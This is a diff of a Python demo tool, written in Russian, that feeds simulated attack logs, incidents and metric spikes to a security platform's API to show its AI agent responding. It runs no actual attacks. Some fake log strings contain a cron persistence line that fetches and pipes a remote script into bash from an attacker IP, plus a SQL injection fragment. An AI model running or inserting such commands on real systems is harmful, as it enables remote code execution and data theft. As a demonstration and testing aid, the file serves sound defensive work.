@@ -6,31 +6,11 @@ import urllib.request
 import urllib.error
 
 BASE_URL = ""
+ATTACKER_IP = "103.45.2.19"
+HONEYPOT_IP = "185.122.90.11"
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
-
-def print_header():
-    clear_screen()
-    print("="*60)
-    print("      🔥 MISTRAL DEFENSE - DEMO ATTACK SIMULATOR 🔥      ")
-    print("="*60)
-    print(" Внимание: Этот скрипт создан для демонстрации работы")
-    print(" систем защиты. Он плавно генерирует логи и алерты.")
-    print("="*60)
-    print()
-
-def api_request(path, data):
-    url = BASE_URL + path
-    req = urllib.request.Request(url, method='POST')
-    req.add_header('Content-Type', 'application/json')
-    jsondata = json.dumps(data).encode('utf-8')
-    try:
-        response = urllib.request.urlopen(req, data=jsondata)
-        return response.read().decode('utf-8')
-    except urllib.error.URLError as e:
-        print(f"   [!] Ошибка соединения с сервером ({url}): {e}")
-        return None
 
 def print_color(text, color):
     colors = {
@@ -42,148 +22,567 @@ def print_color(text, color):
         'cyan': '\033[96m',
         'end': '\033[0m'
     }
-    # Simple fallback if terminal doesn't support ANSI
     if os.name == 'nt':
-        os.system('') # Enable VT100 Escape Sequence for WINDOWS 10
+        os.system('') # Enable VT100 Escape Sequence for Windows
     print(f"{colors.get(color, '')}{text}{colors['end']}")
+
+def print_header():
+    clear_screen()
+    print_color("="*75, "purple")
+    print_color("      🔥 MISTRAL DEFENSE - ADVANCED ATTACK SIMULATOR v4.0 🔥      ", "red")
+    print_color("="*75, "purple")
+    print("  Этот симулятор предназначен для демонстрации возможностей платформы.")
+    print("  Он генерирует события, логи, инциденты и метрики в реальном времени.")
+    print("  Имитирует действия злоумышленника и отслеживает реакцию ИИ-агента.")
+    print_color("="*75, "purple")
+    print()
+
+def api_request(path, data=None, method='POST'):
+    url = BASE_URL + path
+    req = urllib.request.Request(url, method=method)
+    
+    jsondata = None
+    if data is not None:
+        req.add_header('Content-Type', 'application/json')
+        jsondata = json.dumps(data).encode('utf-8')
+        
+    try:
+        if jsondata is not None:
+            response = urllib.request.urlopen(req, data=jsondata)
+        else:
+            response = urllib.request.urlopen(req)
+        return response.read().decode('utf-8')
+    except urllib.error.URLError:
+        return None
 
 def simulate_progress(task_name, duration_sec):
     print(f" [*] {task_name} ", end='', flush=True)
-    steps = 10
+    steps = 15
     sleep_time = duration_sec / steps
     for _ in range(steps):
         time.sleep(sleep_time)
         print(".", end='', flush=True)
     print(" [DONE]")
 
-def send_metric_spike(cpu, ram, disk):
+def send_metric_spike(cpu, ram, disk, connections=142):
     api_request('/api/metrics', {
         'cpu': cpu,
-        'ram': {'percent': ram},
-        'disk': {'percent': disk},
-        'connections': 142,
-        'monitor': 'monitor_system'
+        'ram': {'percent': ram, 'used_mb': int(ram * 163.84), 'total_mb': 16384},
+        'disk': {'percent': disk, 'used_gb': int(disk * 2.4), 'total_gb': 240},
+        'connections': connections,
+        'monitor': 'system_anomaly_watcher',
+        'hostname': 'demo-target-host',
+        'timestamp': time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+        'docker': {'healthy': True, 'count': 4, 'containers': []},
+        'systemd': {'failed_count': 0, 'failed_units': []},
+        'nginx': {'active': True}
     })
 
+def is_ip_quarantined(ip):
+    res_str = api_request('/api/quarantine', method='GET')
+    if not res_str:
+        return False
+    try:
+        q_list = json.loads(res_str)
+        return any(q.get('ip') == ip for q in q_list)
+    except:
+        return False
+
+def wait_for_ai_mitigation(incident_id):
+    print_color("\n [*] Ожидание реакции ИИ-Агента (Mistral SOAR)...", "yellow")
+    print(" (Система опрашивает сервер на наличие отчета ИИ по этому инциденту...)")
+    
+    start_time = time.time()
+    timeout = 45 # 45 seconds timeout
+    while time.time() - start_time < timeout:
+        time.sleep(1.5)
+        res_str = api_request('/api/incidents', method='GET')
+        if not res_str:
+            continue
+        try:
+            res_json = json.loads(res_str)
+            incidents_list = res_json.get('data', [])
+            target_inc = next((inc for inc in incidents_list if inc['id'] == incident_id), None)
+            if target_inc:
+                status = target_inc.get('status', 'new')
+                if status in ['resolved', 'advisory', 'ai_mitigation', 'ai_advisory']:
+                    # Incident is being handled or handled. Let's see if aiAudit is populated
+                    audit = target_inc.get('aiAudit')
+                    if audit:
+                        print_color("\n[🤖 РЕАКЦИЯ ИИ-АГЕНТА ОБНАРУЖЕНА!]", "green")
+                        print_color(f"Статус защиты: {status.upper()}", "cyan")
+                        print_color("-" * 75, "green")
+                        print(audit)
+                        print_color("-" * 75, "green")
+                        return True
+        except Exception as e:
+            pass
+    print_color(" [!] ИИ-Агент не ответил за отведенное время (возможно, ИИ выключен в настройках SOAR).", "yellow")
+    return False
+
+# ── SCENARIO 1 & 2: APT ATTACK ──────────────────────────────────────────
+def run_apt_attack(step_by_step=False):
+    print_header()
+    print_color(f" [ MISTRAL APT ATTACK SIMULATION - {'ПОШАГОВЫЙ РЕЖИМ' if step_by_step else 'ЭКСПРЕСС-РЕЖИМ'} ]", "red")
+    print(f" Target: {BASE_URL}")
+    print(f" Attacker IP: {ATTACKER_IP}")
+    print()
+
+    # Check quarantine
+    if is_ip_quarantined(ATTACKER_IP):
+        print_color(f" [⚠️] Внимание: IP {ATTACKER_IP} уже в бане! Демонстрация может не сработать.", "yellow")
+        print(" Рекомендуется сначала сбросить карантин (пункт [6] в меню).")
+        if step_by_step:
+            input(" Нажмите ENTER, чтобы продолжить все равно...")
+
+    # PHASE 1
+    print_color("\n=== [ФАЗА 1] СБОР ИНФОРМАЦИИ И СКАНИРОВАНИЕ ПОРТОВ (RECON) ===", "cyan")
+    print("Описание: Атакующий запускает скрытое сканирование Nmap Stealth Scan для обнаружения открытых служб.")
+    if step_by_step:
+        input(" Нажмите ENTER, чтобы запустить Фазу 1...")
+    simulate_progress(f"Сканирование сети с IP {ATTACKER_IP}", 2)
+    for i in range(1, 4):
+        api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[Firewall] Port scan detected from {ATTACKER_IP} - port check {i}/3'})
+        time.sleep(0.4)
+    api_request('/api/incidents', {
+        'severity': 'LOW', 'monitor': 'NetworkMonitor', 'type': 'PORT_SCAN',
+        'description': f'Targeted port scan from {ATTACKER_IP}. Nmap SYN Stealth signature detected.'
+    })
+    print_color("  -> Инцидент PORT_SCAN зарегистрирован на сервере.", "green")
+    
+    # PHASE 2
+    print_color("\n=== [ФАЗА 2] ПОПЫТКА СКОМПРОМЕТИРОВАТЬ SSH (BRUTE-FORCE) ===", "cyan")
+    print("Описание: Атакующий осуществляет атаку перебора паролей (Brute-Force) на SSH-порт с помощью Hydra.")
+    if step_by_step:
+        input(" Нажмите ENTER, чтобы запустить Фазу 2...")
+    simulate_progress("Выполнение Hydra SSH Brute-Force", 3)
+    for i in range(1, 6):
+        api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[SSH] Failed password for root from {ATTACKER_IP} port 4833{i} ssh2'})
+        time.sleep(0.3)
+    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[SSH] Successful login for root from {ATTACKER_IP}'})
+    api_request('/api/incidents', {
+        'severity': 'HIGH', 'monitor': 'AuthMonitor', 'type': 'SSH_BRUTE_FORCE_SUCCESS',
+        'description': f'Multiple failed SSH logins followed by a successful root session from {ATTACKER_IP}.'
+    })
+    print_color(f"  -> Инцидент SSH_BRUTE_FORCE_SUCCESS зарегистрирован. root на {ATTACKER_IP} скомпрометирован!", "red")
+
+    # PHASE 3
+    print_color("\n=== [ФАЗА 3] СКАНИРОВАНИЕ И ЭКСПЛУАТАЦИЯ WEB-УЯЗВИМОСТИ (SQLi) ===", "cyan")
+    print("Описание: Атакующий эксплуатирует уязвимость внедрения SQL-кода (SQL Injection) в базу данных.")
+    if step_by_step:
+        input(" Нажмите ENTER, чтобы запустить Фазу 3...")
+    simulate_progress("Обход WAF правил и внедрение SQL-полезной нагрузки", 3)
+    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[WAF] Warning: Suspicious query payload from {ATTACKER_IP} matching rule SQLI_AUTH"})
+    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
+    api_request('/api/incidents', {
+        'severity': 'HIGH', 'monitor': 'WafMonitor', 'type': 'SQL_INJECTION',
+        'description': f'Attacker {ATTACKER_IP} bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint. Leak of user database suspected.'
+    })
+    print_color("  -> Инцидент SQL_INJECTION зарегистрирован.", "yellow")
+
+    # PHASE 4
+    print_color("\n=== [ФАЗА 4] ПОВЫШЕНИЕ ПРИВИЛЕГИЙ И ЗАКРЕПЛЕНИЕ (PRIVILEGE ESCALATION) ===", "cyan")
+    print("Описание: Атакующий использует эксплоит ядра для повышения прав до root и закрепляет доступ в crontab.")
+    if step_by_step:
+        input(" Нажмите ENTER, чтобы запустить Фазу 4...")
+    simulate_progress("Загрузка и компиляция эксплоита DirtyPipe", 3)
+    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Audit] Unauthorized modification of /etc/shadow by UID=1002 from {ATTACKER_IP}"})
+    api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Cron] New cron entry: '* * * * * curl http://{ATTACKER_IP}/shell | bash'"})
+    api_request('/api/incidents', {
+        'severity': 'CRITICAL', 'monitor': 'IntegrityMonitor', 'type': 'PRIVILEGE_ESCALATION',
+        'description': f'Kernel exploit executed from IP {ATTACKER_IP}. /etc/shadow modified. Malicious persistent cron job added.'
+    })
+    print_color("  -> Инцидент PRIVILEGE_ESCALATION зарегистрирован (Критический статус).", "red")
+
+    # PHASE 5
+    print_color("\n=== [ФАЗА 5] НАНЕСЕНИЕ УЩЕРБА И ШИФРОВАНИЕ ДАННЫХ (RANSOMWARE) ===", "cyan")
+    print("Описание: Атакующий запускает шифровальщик. CPU сервера взлетает до 100%, файлы шифруются.")
+    if step_by_step:
+        input(" Нажмите ENTER, чтобы запустить Фазу 5...")
+    print_color(" [!] Имитация скачка метрик сервера до 100%...", "yellow")
+    send_metric_spike(100, 96, 99)
+    simulate_progress("Массовое шифрование файлов в /var/www", 4)
+    for i in range(1, 6):
+        api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f'[Filemon] Mass encryption: /var/www/site_data_{i}.enc by attacker {ATTACKER_IP}'})
+        time.sleep(0.3)
+    
+    inc_res = api_request('/api/incidents', {
+        'severity': 'CRITICAL', 'monitor': 'SystemMonitor', 'type': 'RANSOMWARE_ENCRYPTION',
+        'description': f'Massive file encryption in progress. Spiked CPU resources. IP: {ATTACKER_IP}. Ransom note dropped.'
+    })
+    print_color("  -> Инцидент RANSOMWARE_ENCRYPTION зарегистрирован. Сервер заблокирован.", "red")
+    
+    # Wait for AI report on this attack chain
+    if inc_res:
+        try:
+            inc_id = json.loads(inc_res).get('incidentId')
+            if inc_id:
+                wait_for_ai_mitigation(inc_id)
+        except Exception as e:
+            print(f"Ошибка ожидания ответа ИИ: {e}")
+            
+    # Reset metrics
+    time.sleep(1)
+    send_metric_spike(12, 42, 28)
+
+    print()
+    print_color("="*75, "green")
+    print_color(" [✅] ДЕМОНСТРАЦИОННЫЙ СЦЕНАРИЙ APT ЗАВЕРШЕН!", "green")
+    print_color("="*75, "green")
+    input("\n Нажмите ENTER для возврата в меню...")
+
+# ── SCENARIO 3: HONEYPOT TRIGGER ─────────────────────────────────────────
+def run_honeypot_demo():
+    print_header()
+    print_color(" [ СЦЕНАРИЙ: АТАКА НА ПРИМАНКУ (HONEYPOT DEMO) ]", "cyan")
+    print(" Описание: Атакующий сканирует сеть, натыкается на фейковый платежный шлюз")
+    print(" и пытается его взломать. Ханипот моментально триггерит критический алерт.")
+    print(f" Simulated Attacker IP: {HONEYPOT_IP}")
+    print()
+    
+    if is_ip_quarantined(HONEYPOT_IP):
+        print_color(f" [⚠️] Внимание: IP {HONEYPOT_IP} уже забанен на сервере!", "yellow")
+        print(" Рекомендуется сначала сбросить карантин (пункт [6] в меню).")
+        
+    input(" Нажмите ENTER для запуска симуляции...")
+
+    simulate_progress("Сканирование открытых портов (Discovery)", 2)
+    print_color(" [*] Обнаружен порт 8081 (Фейковый шлюз оплат)", "yellow")
+    time.sleep(1)
+    
+    simulate_progress("Попытка эксплуатации платежного сервиса", 2)
+    
+    # Отправка лога с триггером ханипота
+    api_request('/api/logs', {
+        'type': 'server', 
+        'level': 'warn', 
+        'message': f'[Audit] USER=anonymous PID=8492 PWD=/var/www CMD=curl http://localhost:8081/remon_payment_gateway/exploit IP={HONEYPOT_IP}'
+    })
+    
+    # Отправка инцидента
+    inc_res = api_request('/api/incidents', {
+        'severity': 'CRITICAL',
+        'monitor': 'AuthMonitor-B',
+        'type': 'HONEYPOT_TRIGGERED',
+        'description': f'СРАБАТЫВАНИЕ ХАНИПОТА! Атакующий взаимодействует с фейковым контейнером remon_payment_gateway с IP {HONEYPOT_IP}.'
+    })
+    
+    print_color("\n  -> [КРИТИЧЕСКИЙ] Инцидент HONEYPOT_TRIGGERED отправлен на сервер!", "red")
+    print_color("  -> Запущен автономный протокол ИИ. Ожидайте автоблокировки в клиенте.", "yellow")
+    
+    if inc_res:
+        try:
+            inc_id = json.loads(inc_res).get('incidentId')
+            if inc_id:
+                wait_for_ai_mitigation(inc_id)
+        except Exception as e:
+            print(f"Ошибка ожидания ответа ИИ: {e}")
+            
+    # Проверка бана
+    if is_ip_quarantined(HONEYPOT_IP):
+        print_color(f"\n [✓] ПОДТВЕРЖДЕНО: IP {HONEYPOT_IP} внесен в карантин на сервере!", "green")
+    else:
+        print_color("\n [!] IP не заблокирован. Возможно, выключена опция автозащиты ИИ.", "yellow")
+        
+    input("\n Нажмите ENTER для возврата в меню...")
+
+# ── SCENARIO 4: DDOS FLOOD ───────────────────────────────────────────────
+def run_ddos_flood():
+    print_header()
+    print_color(" [ СЦЕНАРИЙ: DDOS FLOOD & НАГРУЗКА ИНТЕРФЕЙСА ]", "cyan")
+    print(" Описание: Генерирует лавину логов сетевой активности, имитирует")
+    print(" колоссальный скачок сетевых подключений и поднимает загрузку CPU до 100%.")
+    print()
+    input(" Нажмите ENTER для запуска флуда...")
+
+    print_color(" [!] ЗАПУСК FLOOD-АТАКИ... СПАМ ЛОГОВ...", "red")
+    
+    # Send Incident
+    api_request('/api/incidents', {
+        'severity': 'HIGH',
+        'monitor': 'NetworkMonitor',
+        'type': 'DDOS_FLOOD_ACTIVE',
+        'description': 'Massive SYN-Flood / HTTP-Flood attack detected from botnet subnet 82.102.0.0/16. Ingress connections spiked.'
+    })
+
+    # Rapid logs and metric spikes
+    conn_count = 100
+    for i in range(1, 41):
+        conn_count += 150
+        cpu_val = min(40 + i * 2, 100)
+        ram_val = min(50 + i, 98)
+        
+        send_metric_spike(cpu_val, ram_val, 88, connections=conn_count)
+        
+        api_request('/api/logs', {
+            'type': 'server',
+            'level': 'warn',
+            'message': f'[Firewall] SYN FLOOD packet dropped: source=82.102.32.{i} target=port_80'
+        })
+        print(f"\r  Отправлено {i*5} сетевых пакетов... Активных соединений: {conn_count}", end='', flush=True)
+        time.sleep(0.1)
+
+    print()
+    print_color("\n  -> [HIGH] Инцидент DDOS_FLOOD_ACTIVE зарегистрирован.", "yellow")
+    print_color("  -> Сетевая активность на графиках клиента должна показывать резкий пик.", "green")
+    
+    time.sleep(2)
+    print_color("\n [!] Стабилизация показателей метрик...", "blue")
+    send_metric_spike(15, 45, 28, connections=90)
+    
+    input("\n Нажмите ENTER для возврата в меню...")
+
+# ── SCENARIO 5: INTERACTIVE HACKER SANDBOX ────────────────────────────────
+def run_interactive_sandbox():
+    attacker_ip = "103.45.2.19"
+    while True:
+        print_header()
+        print_color(" 🛡️ [ ИНТЕРАКТИВНАЯ ПЕСОЧНИЦА ХАКЕРА ] 🛡️", "purple")
+        print(f" Целевой хост: {BASE_URL}")
+        print(f" Ваш виртуальный IP-адрес: {attacker_ip}")
+        
+        # Check current quarantine status of this IP
+        quarantined = is_ip_quarantined(attacker_ip)
+        if quarantined:
+            print_color(" СТАТУС ПОДКЛЮЧЕНИЯ: [❌ ЗАБЛОКИРОВАН В UFW (В КАРАНТИНЕ)]", "red")
+        else:
+            print_color(" СТАТУС ПОДКЛЮЧЕНИЯ: [🟢 АКТИВНО (АКУСТИКА ЧИСТАЯ)]", "green")
+            
+        print("\n Выберите действие:")
+        print("  [1] Сканирование портов (Nmap SYN scan) [LOW RISK]")
+        print("  [2] Перебор паролей SSH (Hydra Brute Force) [HIGH RISK]")
+        print("  [3] Внедрение SQL-кода (SQL Injection) [HIGH RISK]")
+        print("  [4] Повышение привилегий (Privilege Escalation) [CRITICAL RISK]")
+        print("  [5] Запуск Ransomware (Критический риск) [CRITICAL RISK]")
+        print("  [6] Запрос к платежному шлюзу-приманке (Honeypot) [INSTANT BAN]")
+        print("  [7] Проверить отчет ИИ по последнему инциденту")
+        print("  [8] Разблокировать мой IP на сервере")
+        print("  [0] Назад в главное меню")
+        print()
+        
+        choice = input(" Действие > ").strip()
+        if choice == '0':
+            break
+            
+        if quarantined and choice in ['1', '2', '3', '4', '5', '6']:
+            print_color("\n [!] Ошибка: Вы заблокированы! Ваши сетевые пакеты сбрасываются брандмауэром сервера.", "red")
+            print(" Используйте пункт [8] для разблокировки IP перед продолжением.")
+            input("\n Нажмите ENTER...")
+            continue
+            
+        if choice == '1':
+            print_color("\n [*] Запуск Nmap Stealth Scan...", "yellow")
+            simulate_progress("Сканирование портов", 1.5)
+            api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[Firewall] Port scan detected from {attacker_ip} on ports 22, 80, 443, 8080'})
+            api_request('/api/incidents', {
+                'severity': 'LOW', 'monitor': 'NetworkMonitor', 'type': 'PORT_SCAN',
+                'description': f'Targeted port scan from {attacker_ip}. Nmap SYN Stealth signature detected.'
+            })
+            print_color("  [✓] Инцидент PORT_SCAN зарегистрирован на сервере.", "green")
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '2':
+            print_color("\n [*] Запуск Hydra SSH Brute Force...", "yellow")
+            simulate_progress("Подбор паролей SSH", 2)
+            for i in range(1, 4):
+                api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[SSH] Failed password for root from {attacker_ip} port {5000+i}'})
+                time.sleep(0.3)
+            
+            inc_res = api_request('/api/incidents', {
+                'severity': 'HIGH', 'monitor': 'AuthMonitor', 'type': 'SSH_BRUTE_FORCE_SUCCESS',
+                'description': f'Multiple failed SSH logins followed by a successful root session from {attacker_ip}.'
+            })
+            print_color("  [✓] Инцидент SSH_BRUTE_FORCE_SUCCESS зарегистрирован.", "red")
+            
+            if inc_res:
+                try:
+                    inc_id = json.loads(inc_res).get('incidentId')
+                    if inc_id:
+                        wait_for_ai_mitigation(inc_id)
+                except:
+                    pass
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '3':
+            print_color("\n [*] Выполнение SQL-инъекции на /api/auth/login...", "yellow")
+            simulate_progress("Обход WAF и SQLi", 2)
+            api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[WAF] Warning: Suspicious query payload from {attacker_ip} matching rule SQLI_AUTH"})
+            inc_res = api_request('/api/incidents', {
+                'severity': 'HIGH', 'monitor': 'WafMonitor', 'type': 'SQL_INJECTION',
+                'description': f'Attacker {attacker_ip} bypassed WAF rules and executed SQL injection. Potential database leak.'
+            })
+            print_color("  [✓] Инцидент SQL_INJECTION зарегистрирован.", "red")
+            
+            if inc_res:
+                try:
+                    inc_id = json.loads(inc_res).get('incidentId')
+                    if inc_id:
+                        wait_for_ai_mitigation(inc_id)
+                except:
+                    pass
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '4':
+            print_color("\n [*] Запуск локального эксплоита для повышения привилегий...", "yellow")
+            simulate_progress("DirtyPipe Exploit execution", 2.5)
+            api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Audit] Unauthorized privilege escalation attempt by {attacker_ip}"})
+            inc_res = api_request('/api/incidents', {
+                'severity': 'CRITICAL', 'monitor': 'IntegrityMonitor', 'type': 'PRIVILEGE_ESCALATION',
+                'description': f'Kernel exploit executed from IP {attacker_ip}. /etc/shadow modified.'
+            })
+            print_color("  [✓] Инцидент PRIVILEGE_ESCALATION зарегистрирован.", "red")
+            
+            if inc_res:
+                try:
+                    inc_id = json.loads(inc_res).get('incidentId')
+                    if inc_id:
+                        wait_for_ai_mitigation(inc_id)
+                except:
+                    pass
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '5':
+            print_color("\n [*] Запуск Ransomware скрипта...", "yellow")
+            send_metric_spike(100, 95, 99)
+            simulate_progress("Шифрование файлов /var/www", 3)
+            api_request('/api/logs', {'type': 'server', 'level': 'error', 'message': f"[Filemon] Encryption anomaly detected on IP {attacker_ip}"})
+            inc_res = api_request('/api/incidents', {
+                'severity': 'CRITICAL', 'monitor': 'SystemMonitor', 'type': 'RANSOMWARE_ENCRYPTION',
+                'description': f'Massive file encryption in progress by {attacker_ip}. Spiked CPU resources.'
+            })
+            print_color("  [✓] Инцидент RANSOMWARE_ENCRYPTION зарегистрирован.", "red")
+            
+            if inc_res:
+                try:
+                    inc_id = json.loads(inc_res).get('incidentId')
+                    if inc_id:
+                        wait_for_ai_mitigation(inc_id)
+                except:
+                    pass
+            time.sleep(1)
+            send_metric_spike(12, 42, 28)
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '6':
+            print_color("\n [*] Попытка доступа к шлюзу remon_payment_gateway...", "yellow")
+            simulate_progress("Взаимодействие с ханипотом", 2)
+            api_request('/api/logs', {'type': 'server', 'level': 'warn', 'message': f'[Audit] CMD=curl http://localhost:8081/remon_payment_gateway/exploit IP={attacker_ip}'})
+            inc_res = api_request('/api/incidents', {
+                'severity': 'CRITICAL', 'monitor': 'AuthMonitor-B', 'type': 'HONEYPOT_TRIGGERED',
+                'description': f'СРАБАТЫВАНИЕ ХАНИПОТА! Атакующий взаимодействует с фейковым контейнером remon_payment_gateway с IP {attacker_ip}.'
+            })
+            print_color("  [✓] Инцидент HONEYPOT_TRIGGERED зарегистрирован.", "red")
+            
+            if inc_res:
+                try:
+                    inc_id = json.loads(inc_res).get('incidentId')
+                    if inc_id:
+                        wait_for_ai_mitigation(inc_id)
+                except:
+                    pass
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '7':
+            print_color("\n [*] Получение последнего инцидента на сервере...", "yellow")
+            res_str = api_request('/api/incidents', method='GET')
+            if res_str:
+                try:
+                    incidents_list = json.loads(res_str).get('data', [])
+                    if incidents_list:
+                        latest = incidents_list[0]
+                        print(f" Последний инцидент: {latest.get('type')} (ID: {latest.get('id')})")
+                        print(f" Статус: {latest.get('status')} | Уровень: {latest.get('severity')}")
+                        audit = latest.get('aiAudit')
+                        if audit:
+                            print_color("\n[Отчет ИИ-Агента]:", "green")
+                            print(audit)
+                        else:
+                            print(" Отчет ИИ отсутствует для этого инцидента.")
+                    else:
+                        print(" Инциденты не найдены.")
+                except Exception as e:
+                    print(f" Ошибка парсинга: {e}")
+            else:
+                print(" Не удалось получить инциденты.")
+            input("\n Нажмите ENTER...")
+            
+        elif choice == '8':
+            api_request(f'/api/quarantine/{attacker_ip}', method='DELETE')
+            print_color(f"\n [✓] Ваш IP {attacker_ip} успешно разблокирован на сервере!", "green")
+            time.sleep(1.5)
+
+# ── RESET QUARANTINE FUNCTION ───────────────────────────────────────────
+def clear_all_quarantine():
+    print_color("\n [*] Запрос списка заблокированных IP...", "yellow")
+    res_str = api_request('/api/quarantine', method='GET')
+    if not res_str:
+        print_color(" [!] Не удалось получить список карантина.", "red")
+        time.sleep(1.5)
+        return
+    try:
+        q_list = json.loads(res_str)
+        if not q_list:
+            print_color(" [✓] Карантин пуст, разблокировка не требуется.", "green")
+            time.sleep(1.5)
+            return
+        
+        print_color(f" [*] Найдено {len(q_list)} заблокированных IP. Разблокировка...", "yellow")
+        for q in q_list:
+            ip = q.get('ip')
+            if ip:
+                api_request(f'/api/quarantine/{ip}', method='DELETE')
+                print(f"  [+] IP {ip} разблокирован.")
+        print_color(" [✓] Все IP-адреса успешно разблокированы!", "green")
+    except Exception as e:
+        print_color(f" [!] Ошибка при разблокировке: {e}", "red")
+    time.sleep(1.5)
+
+# ── MAIN MENU ────────────────────────────────────────────────────────────
 def main():
     global BASE_URL
     print_header()
     
-    target = input(" Введите адрес Mistral Server (например, http://raemon.ru:8080 или нажмите ENTER для http://localhost:8080):\n > ").strip()
+    target = input(" Введите адрес Mistral Server (например, http://localhost:8080 или нажмите ENTER):\n > ").strip()
     if not target:
         target = "http://localhost:8080"
     if not target.startswith("http"):
         target = "http://" + target
     BASE_URL = target.rstrip('/')
-
-    print_color("\n [ MISTRAL ATTACK FRAMEWORK v2.0 ]", "red")
-    print(f" Target: {BASE_URL}")
-    print(" Status: ARMED AND READY")
-    print(" \n Нажмите ENTER, чтобы запустить симуляцию APT-атаки (Phase 1-5)...")
-    input()
-    
-    clear_screen()
-    print_color("""
-    ███╗   ███╗██╗███████╗████████╗██████╗  █████╗ ██╗     
-    ████╗ ████║██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     
-    ██╔████╔██║██║███████╗   ██║   ██████╔╝███████║██║     
-    ██║╚██╔╝██║██║╚════██║   ██║   ██╔══██╗██╔══██║██║     
-    ██║ ╚═╝ ██║██║███████║   ██║   ██║  ██║██║  ██║███████╗
-    ╚═╝     ╚═╝╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
-    [ ADVANCED PERSISTENT THREAT SIMULATOR INITIATED ]
-    """, "red")
-    time.sleep(2)
-
-    # ---------------------------------------------------------
-    # PHASE 1: RECON
-    # ---------------------------------------------------------
-    print_color("\n === [PHASE 1] RECONNAISSANCE & SCANNING ===", "cyan")
-    simulate_progress("Running Nmap Stealth Scan", 2)
-    for i in range(1, 4):
-        api_request('/api/logs', {'type': 'network', 'level': 'warn', 'message': f'[Firewall] SYN flood detected from 103.45.2.19 - port scan attempt {i}/3'})
-        time.sleep(0.5)
-    
-    api_request('/api/incidents', {
-        'severity': 'LOW', 'monitor': 'monitor_network', 'type': 'Port Scan Detected',
-        'description': 'Targeted port scan from 103.45.2.19. Nmap SYN Stealth signature detected.'
-    })
-    print_color("  -> [LOW] Incident logged on server.", "green")
-    time.sleep(3)
-
-    # ---------------------------------------------------------
-    # PHASE 2: INITIAL ACCESS
-    # ---------------------------------------------------------
-    print_color("\n === [PHASE 2] INITIAL ACCESS (BRUTE-FORCE) ===", "cyan")
-    simulate_progress("Executing Hydra SSH Brute-Force", 3)
-    for i in range(1, 6):
-        api_request('/api/logs', {'type': 'auth', 'level': 'warn', 'message': f'[SSH] Failed password for root from 103.45.2.19 port 4833{i} ssh2'})
-        time.sleep(0.3)
-    
-    api_request('/api/logs', {'type': 'auth', 'level': 'error', 'message': '[SSH] Session opened for root by 103.45.2.19'})
-    
-    api_request('/api/incidents', {
-        'severity': 'MEDIUM', 'monitor': 'monitor_auth', 'type': 'Brute-force SSH Success',
-        'description': 'Multiple failed SSH logins followed by a successful root session from 103.45.2.19.'
-    })
-    print_color("  -> [MEDIUM] Incident logged: SSH Compromised.", "yellow")
-    time.sleep(3)
-
-    # ---------------------------------------------------------
-    # PHASE 3: WEB EXPLOITATION
-    # ---------------------------------------------------------
-    print_color("\n === [PHASE 3] WEB APP EXPLOITATION (SQLi) ===", "cyan")
-    simulate_progress("Bypassing WAF & Injecting Payload", 2)
-    api_request('/api/logs', {'type': 'waf', 'level': 'error', 'message': "[WAF] Warning: Suspicious payload matching rule SQLI_AUTH"})
-    api_request('/api/logs', {'type': 'db', 'level': 'error', 'message': "[DB] SQL Syntax error near 'UNION SELECT NULL, password FROM users--'"})
-    
-    api_request('/api/incidents', {
-        'severity': 'HIGH', 'monitor': 'monitor_waf', 'type': 'SQL Injection / WAF Bypass',
-        'description': 'Attacker 103.45.2.19 bypassed WAF rules and successfully executed SQL injection on /api/auth endpoint. Possible password hash leak.'
-    })
-    print_color("  -> [HIGH] Incident logged: SQLi Success.", "yellow")
-    time.sleep(3)
-
-    # ---------------------------------------------------------
-    # PHASE 4: PRIVILEGE ESCALATION
-    # ---------------------------------------------------------
-    print_color("\n === [PHASE 4] PRIVILEGE ESCALATION & PERSISTENCE ===", "cyan")
-    simulate_progress("Uploading kernel exploit (DirtyPipe)", 3)
-    api_request('/api/logs', {'type': 'system', 'level': 'critical', 'message': "[Kernel] Unhandled fault: page domain fault (11)"})
-    api_request('/api/logs', {'type': 'system', 'level': 'error', 'message': "[Audit] Unauthorized modification of /etc/shadow"})
-    api_request('/api/logs', {'type': 'system', 'level': 'error', 'message': "[Cron] New unknown crontab entry for user root: '* * * * * curl http://103.45.2.19/rev | bash'"})
-    
-    api_request('/api/incidents', {
-        'severity': 'CRITICAL', 'monitor': 'monitor_system', 'type': 'Privilege Escalation & Persistence',
-        'description': 'Kernel exploit detected. /etc/shadow modified and malicious cron job established. System is fully compromised.'
-    })
-    print_color("  -> [CRITICAL] Incident logged: Root Compromised.", "red")
-    time.sleep(4)
-
-    # ---------------------------------------------------------
-    # PHASE 5: IMPACT (RANSOMWARE)
-    # ---------------------------------------------------------
-    print_color("\n === [PHASE 5] IMPACT (RANSOMWARE DEPLOYMENT) ===", "red")
-    print_color(" [!] SPIKING SERVER METRICS TO 100% CPU...", "yellow")
-    send_metric_spike(100, 95, 99)
-    simulate_progress("Encrypting /var/www and /home directories", 5)
-    
-    for i in range(1, 10):
-        api_request('/api/logs', {'type': 'system', 'level': 'critical', 'message': f"[Filemon] Mass encryption detected. File: /var/www/data_{i}.enc"})
-        time.sleep(0.2)
+ 
+    while True:
+        print_header()
+        print(f" Подключено к серверу: {BASE_URL}")
